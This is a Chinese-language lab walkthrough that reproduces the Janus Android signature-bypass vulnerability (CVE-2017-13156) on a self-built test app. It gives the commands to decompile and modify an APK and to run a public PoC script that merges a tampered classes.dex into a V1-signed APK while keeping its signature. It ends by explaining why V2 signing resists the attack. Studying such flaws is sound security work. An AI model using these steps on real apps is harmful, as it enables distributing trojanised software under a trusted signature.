###### 背景

Google 在 12 月发布的安卓系统安全公告中披露了一个名为“Janus”的安卓漏洞（漏洞编号：CVE-2017-13156）。该漏洞可以让攻击者绕过安卓系统的 signature scheme V1 签名机制，进而直接对 App 进行篡改。基于 signature scheme V2 签名的 App 则不受影响。

影响范围：Android 5.1.1、6.0、6.0.1、7.0、7.1.1、7.1.2、8.0 以及基于 signature scheme V1 签名机制的 App 均受“Janus”漏洞影响。

###### 工具准备

- Android Studio —— 用于生成一个 V1 签名的受害者（apk）
- Java JDK —— 提取及查看 rsa 文件（签名文件）
- Android Killer —— 反编译及回编译
- apktool_2.3.1
- janus.py —— POC

###### 一. 有请受害者——HelloWord.apk

```xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context="com.k_bone.gristle.helloword.HelloWord">

    <TextView
        android:id="@+id/textView"
        android:layout_width="wrap_content"
        android:layout_height="21dp"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"
        android:text="HelloWord"
        tools:layout_editor_absoluteX="372dp"
        tools:layout_editor_absoluteY="400dp" />

</RelativeLayout>
```

```java
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;

public class HelloWord extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView textView = (TextView)findViewById(R.id.textView);
        textView.setText("HelloWord");
    }
}
```

###### 使用命令

使用 `adb shell dumpsys package xxx`（这里的 `xxx` 是指你的 apk 包名）的命令查看 `apkSigningVersion` 的值为多少。

![查看 apkSigningVersion](/assets/janus-4.png)

###### 三. 先确认该 APK 的签名，在命令行进入 java 根目录

输入查找 apk 里的 rsa 文件的命令：

```bash
jar tf D:\Testing\Vuls\Janus\apk\app\release\app-release.apk | findstr RSA
```

![查找 apk 里的 rsa 文件](/assets/janus-5.png)

从 apk 中解压 rsa 文件：

```bash
jar xf D:\Testing\Vuls\Janus\apk\app\release\app-release.apk META-INF/CERT.RSA
```

![解压 rsa 文件 1](/assets/janus-6.png)

![解压 rsa 文件 2](/assets/janus-7.png)

查看三方应用或是系统应用签名：

```bash
keytool -printcert -file META-INF/CERT.RSA
```

![查看签名](/assets/janus-8.png)

###### 四. 对该 APK 进行反编译

使用工具 Android Killer（亦可用其他的反编译工具），卡死的时候关闭 Android Killer 再开即可。

![Android Killer 反编译](/assets/janus-9.png)

搜索关键字 HelloWord 将内容进行修改保存并回编译。

![修改并回编译](/assets/janus-10.png)

使用 Android Killer 编译功能进行回编译。

![回编译 1](/assets/janus-11.png)

![回编译 2](/assets/janus-12.png)

也可以使用 apktool 进行回编译，命令：

```bash
java -jar apktool.jar b -f XXXX回编译的文件夹路径
```

编译出来的新 Apk，使用的签名并不是之前 Hello 签名，但我们只是需要里面的 DEX 文件。使用压缩工具将 `classes.dex` 文件取出。

![取出 classes.dex](/assets/janus-13.png)

###### 五. Janus 利用——[POC 传送门](https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156)

下载 `janus.py` 文件。将 `janus.py`、步骤一编译的 `app-release.apk`（已改名为 `HelloWord.apk`）、步骤四的 `classes.dex` 文件放同一目录下，使用 Python 2.7 执行命令：

```bash
python janus.py classes.dex HelloWord.apk outHelloWord.apk
```

对 `outHelloWord.apk` 进行安装并打开。

![Janus 利用 1](/assets/janus-14.png)

![Janus 利用 2](/assets/janus-15.png)

再确认签名是否一致，使用 WinRAR 打开 `outHelloWord.apk` 会提示报错，请使用步骤三的方法进行提取 RSA 文件。

![确认签名](/assets/janus-16.png)

至此，Janus 的利用方式已完全展示。

###### 六：结尾

Android APK 签名机制分为两个版本：v1 和 v2 版本。两个版本的签名区别在于，前者是对 APK 中的每个文件进行签名，如果 APK 中某个文件被篡改了，那么签名验证将会通不过；后者则是对整个 APK 文件进行签名，只要 APK 文件的内容发生变化则签名失效。

Janus 漏洞是针对 APK 文件的攻击，因此 v1 签名无法抵御这类攻击，而 v2 签名可以抵御。
